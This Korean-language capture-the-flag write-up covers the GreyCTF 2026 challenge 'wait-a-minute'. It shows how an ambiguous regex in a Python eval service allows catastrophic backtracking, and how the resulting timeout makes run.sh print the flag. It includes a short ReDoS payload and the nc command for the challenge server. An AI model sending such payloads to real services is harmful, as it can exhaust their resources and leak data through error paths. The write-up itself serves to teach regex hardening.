---
ctf_name: "GreyCTF 2026"
challenge_name: "wait-a-minute"
category: "misc"
difficulty: "medium"
author: "inhwan689"
date: "2026-05-30"
tags: [ReDoS, regex, python-jail]
---

# wait-a-minute

## 문제 설명

Python 코드를 입력받아 eval하는 서비스.

- `nc challs.nusgreyhats.org 36267`

## 풀이

### 분석

`run.sh`의 구조가 핵심:

```sh
output=$(timeout 60 python server.py "$input" 2>&1)
status=$?
case $status in
    0) echo "$output" ;;
    1) echo "$output" ;;
    *) echo "Internal error: $(cat logs/err.log)" ;;  # 플래그!
esac
```

`logs/err.log`는 Dockerfile에서 `flag.txt`를 복사한 파일이다. Python이 60초 안에 끝나지 않으면 `timeout`이 exit code **124**로 종료하고, `case *` 브랜치에서 플래그가 출력된다.

### 취약점

`server.py`의 정규식:

```python
base = f'[a-zA-Z0-9=+\\-\\/:_\\.\\"\\\'\\s\\(\\)\\[\\]]*?'  # [ ] 포함
group_sq = f'\\[{base}\\]'
pattern = re.compile(f'^({base}|{group_sq}|{group_rd})*$')
```

`base` 문자 클래스에 `[`, `]`가 포함되어 있어 `[a]` 하나를 파싱하는 방법이 두 가지다:
- `group_sq` 로 통째로: `[a]`
- `base` 3번: `[` + `a` + `]`

`[a]`가 N개 있고 마지막에 유효하지 않은 문자가 오면 **2^N가지** 조합을 전부 시도하다 실패 → ReDoS.

### 익스플로잇

페이로드 (31자):
```
[a][a][a][a][a][a][a][a][a][a]@
```

```sh
nc challs.nusgreyhats.org 36267
'[a][a][a][a][a][a][a][a][a][a]@' | 
```

약 60초 후 플래그 출력.

## 플래그

```
grey{REDACTED}
```

## 배운 점

- `(A|B)*` 패턴에서 A와 B가 같은 문자열을 다른 방식으로 파싱할 수 있으면 ReDoS에 취약하다.
- 정규식 방어 시 내부 quantifier만 lazy로 바꾸는 것으로는 충분하지 않다.
